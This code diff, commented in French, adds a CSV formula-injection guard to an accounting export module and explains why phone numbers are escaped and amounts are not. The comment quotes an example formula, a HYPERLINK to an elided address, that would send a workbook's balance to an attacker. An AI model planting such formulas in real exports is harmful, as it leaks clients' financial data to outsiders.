@@ -33,6 +33,32 @@
   // qu'une pièce est UNE pièce, et que ses lignes s'équilibrent entre elles.
   const cleDePiece = e => `${e.journal || ''}|${e.piece || ''}|${e.date || ''}`;
 
+  // ---------------------------------------------------------------- l'injection de formule CSV
+  //
+  // Un tableur ne lit pas un CSV comme un fichier de données : une cellule qui commence par `=`,
+  // `+`, `-` ou `@` est une FORMULE, qu'il exécute à l'ouverture. Un libellé de facture ou un nom
+  // de client passe dans nos exports tel quel — et nos exports, on les envoie au comptable. Écrire
+  // `=HYPERLINK("http://…"&A1)` dans le libellé d'une ligne suffisait à faire partir le contenu de
+  // sa balance vers une adresse choisie par celui qui a tapé le libellé, sans que rien ne plante et
+  // sans qu'il voie autre chose qu'une cellule un peu bizarre. La parade est celle de tout le
+  // monde : une apostrophe devant, que le tableur mange et qui force le texte.
+  //
+  // La tabulation et le retour chariot y sont aussi : certains tableurs les avalent et découvrent
+  // le `=` derrière.
+  //
+  // Elle est volontairement STRICTE, et ne fait aucune exception pour ce qui ressemble à un
+  // nombre : c'est à l'appelant de ne pas lui donner ses montants. Dans `core.toCsv`, les colonnes
+  // `money` et `date` sortent par leur propre branche et ne la voient jamais — un `-12,500` reste
+  // donc un montant. Et un numéro de téléphone `+216 71 123 456`, lui, DOIT être préfixé : c'est
+  // du texte, et un tableur qui l'évalue le remplace par `#NOM?`. Une exception « ça ressemble à
+  // un nombre » l'aurait perdu, parce qu'aucune règle ne distingue un téléphone d'un montant.
+  //
+  // Corps IDENTIQUE à celui recopié dans `src/cabinet/cabcore.js` (qui ne charge pas ce module) —
+  // un test l'exige, comme pour `round3`.
+  function csvDangereux(cellule) {
+    return /^[=+\-@\t\r]/.test(cellule);
+  }
+
   const txt = v => String(v == null ? '' : v).trim();
   const num = v => Number(v) || 0;
 
@@ -463,7 +489,7 @@
   }
 
   return {
-    round3, cleDePiece, nombreDepuisCsv, dateDepuisCsv,
+    round3, cleDePiece, csvDangereux, nombreDepuisCsv, dateDepuisCsv,
     ecritureValide, entreesDepuisCsv,
     entriesBalance, entriesByAccount,
     balanceDepuisLignes, grandLivreDepuisLignes,
